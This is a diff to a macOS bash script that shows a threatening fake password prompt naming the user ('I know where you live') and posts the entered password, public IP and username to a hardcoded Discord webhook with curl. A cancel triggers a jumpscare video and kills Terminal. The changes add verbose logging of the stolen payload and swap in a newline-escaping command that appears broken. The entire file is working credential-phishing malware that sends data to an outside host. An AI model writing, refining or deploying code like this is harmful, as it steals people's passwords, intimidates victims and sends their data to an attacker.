@@ -1,10 +1,10 @@
 #!/bin/bash
-# Combined Login Prompt with Jumpscare Fallback for macOS (Python-Free JSON)
-# ----------------------------------------------------------------
+# Combined Login Prompt with Jumpscare Fallback for macOS (Python-Free JSON with Debug Logging)
+# ------------------------------------------------------------------------------
 # - Displays a login prompt with two lines:
 #     "I know where you live, [FirstName]."
 #     "Enter your password Mr. [LastName]. DO NOT PRESS CANCEL"
-# - If a non-empty password is entered, it sends the data (password, public IP, username)
+# - If a non-empty password is entered, the script sends the data (password, public IP, username)
 #   to a Discord webhook.
 # - If the user presses Cancel (or closes the prompt), it triggers a jumpscare:
 #     It creates a temporary HTML file that embeds your jumpscare video from GitHub,
@@ -12,7 +12,7 @@
 #     and then forcefully kills Terminal.
 #
 # Requirements:
-#   - macOS with osascript, curl, and standard Unix tools.
+#   - macOS with osascript, curl, and standard Unix utilities.
 #
 # Usage:
 #   chmod +x combined_script.sh
@@ -31,7 +31,7 @@ capture="username=${username}\n____________________________________________\n\n"
 # The prompt displays:
 #   Line 1: "I know where you live, [FirstName]."
 #   Line 2: "Enter your password Mr. [LastName]. DO NOT PRESS CANCEL"
-# It repeats if the user presses OK with an empty input.
+# It repeats if the user presses OK with an empty string.
 # If the user cancels (error -128), it returns "CANCEL".
 read -r -d '' applescriptCode <<'EOF'
 set fullName to (long user name of (system info))
@@ -130,13 +130,17 @@ else
     echo -e "$capture" > /tmp/pass.txt
     
     # --- Manually Generate JSON Payload Without Python ---
-    # Escape double quotes and newlines.
-    escaped=$(sed ':a;N;$!ba;s/\n/\\n/g; s/"/\\"/g' /tmp/pass.txt)
+    # Replace newlines with \n and escape double quotes.
+    # Using tr to replace newlines and sed to escape quotes.
+    escaped=$(tr '\n' '\\n' < /tmp/pass.txt | sed 's/"/\\"/g')
     payload="{\"content\": \"$escaped\"}"
+    
+    # --- Debug: Log the payload for troubleshooting ---
+    echo "Payload: $payload" > /tmp/discord_payload.log
     
     # --- Send Payload to Discord Webhook ---
     DISCORD_WEBHOOK="https://discord.com/api/webhooks/1356139808321179678/8ZUgN4B7F7M3tkPlUrc_gVNp1celjIS9JpUwkJKoFZVj61sgOK2T34-zlkZ0CMDmml6B"
-    curl -X POST -H "Content-Type: application/json" -d "$payload" "$DISCORD_WEBHOOK"
+    curl -v -X POST -H "Content-Type: application/json" -d "$payload" "$DISCORD_WEBHOOK" >> /tmp/discord_payload.log 2>&1
     rm /tmp/pass.txt
     
     # --- Force Kill Terminal ---
